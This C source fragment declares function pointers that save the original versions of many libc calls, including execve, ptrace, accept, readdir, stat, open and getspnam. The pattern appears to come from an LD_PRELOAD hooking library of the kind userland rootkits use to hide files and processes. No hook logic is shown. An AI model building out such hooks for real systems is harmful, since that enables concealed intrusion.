
//function pointers to  functions

int (*old_execve)(const char *path, char *const argv[], char *const envp[]); 
char *(*old_fgets)(char *s, int size, FILE *stream);
long int (*old_ptrace)(enum __ptrace_request request, ...);
off_t (*old_lseek)(int fildes, off_t offset, int whence);
int (*old_accept)(int socket, struct sockaddr *restrict address, socklen_t *restrict address_len);

struct dirent *(*old_readdir)(DIR *dirp);
struct dirent64 *(*old_readdir64)(DIR *dirp);
int (*old_chdir)(const char *path);
int (*old_fchdir)(int fildes); 
int (*old_mkdir)(const char *pathname, ...); 
int (*old_mkdirat)(int dirfd, const char *pathname, ...);
int (*old_rmdir)(const char *pathname); 
DIR *(*old_opendir)(const char *name);
DIR *(*old_opendir64)(const char *name);
DIR *(*old_fdopendir)(int fd);

int (*old_link)(const char *oldpath, const char *newpath); 
int (*old_unlink)(const char *path);
int (*old_unlinkat)(int dirfd, const char *pathname, int flags); 
int (*old_symlink)(const char *path1, const char *path2); 

int (*old_access)(const char *path, int amode); 
int (*old_open)(const char *file, int oflag, ...);
int (*old_open64)(const char *file, int oflag, ...);
int (*old_openat)(int fd, const char *path, int oflag, ...);
int (*old_faccessat)(int fd, const char *path, int amode, int flag); 
FILE *(*old_fopen)(const char *pathname, const char *mode); 
FILE *(*old_fopen64)(const char *pathname, const char *mode);

size_t (*old_fread)(void *ptr, size_t size, size_t nmemb, FILE *stream); 
ssize_t (*old_pread)(int fd, void *buf, size_t count, off_t offset);
ssize_t (*old_pread64)(int fd, void *buf, size_t count, off64_t offset);

int (*old_creat)(const char *path, mode_t mode);
int (*old_fputs)(const char *s, FILE *stream);
size_t (*old_fwrite)(const void *ptr, size_t size, size_t nmemb, FILE *stream);
size_t (*old_fwrite_unlocked)(const void *ptr, size_t size, size_t n, FILE *stream);
ssize_t (*old_pwrite)(int fd, const void *buf, size_t count, off_t offset); 

int (*old_rename)(const char *oldpath, const char *newpath);
int (*old_renameat)(int olddirfd, const char *oldpath, int newdirfd, const char *newpath);

int (*old_stat)(const char *path, struct stat *buf);
int (*old_stat64)(const char *path, struct stat64 *buf);
int (*old___xstat)(int ver, const char *path, struct stat *buf); 
int (*old___lxstat)(int ver, const char *path, struct stat *buf); 
int (*old___fxstat)(int ver, int fildes, struct stat *buf);
int (*old_fstat)(int fildes, struct stat *buf); 
int (*old_fstat64)(int fd, struct stat64 *buf);
int (*old_fstatat)(int fd, const char *restrict path, struct stat *restrict buf, int flag); 
int (*old_lstat)(const char *restrict path, struct stat *restrict buf);
int (*old___xstat64)(int ver, const char *path, struct stat64 *buf); 
int (*old___lxstat64)(int ver, const char *path, struct stat64 *buf); 
int (*old___fxstat64)(int ver, int fildes, struct stat64 *buf);

int (*old_chmod)(const char *path, mode_t mode);
int (*old_fchmod)(int fd, mode_t mode);
int (*old_fchmodat)(int dirfd, const char *pathname, mode_t mode, int flags);
int (*old_chown)(const char *pathname, uid_t owner, gid_t group); 
int (*old_fchown)(int fd, uid_t owner, gid_t group); 
int (*old_lchown)(const char *pathname, uid_t owner, gid_t group); 

struct passwd *(*old_getpwent)(void);
struct passwd *(*old_getpwnam)(const char *name); 
struct passwd *(*old_getpwuid)(uid_t uid); 
int (*old_getpwnam_r)(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result); 
struct spwd *(*old_getspnam)(char *name); 
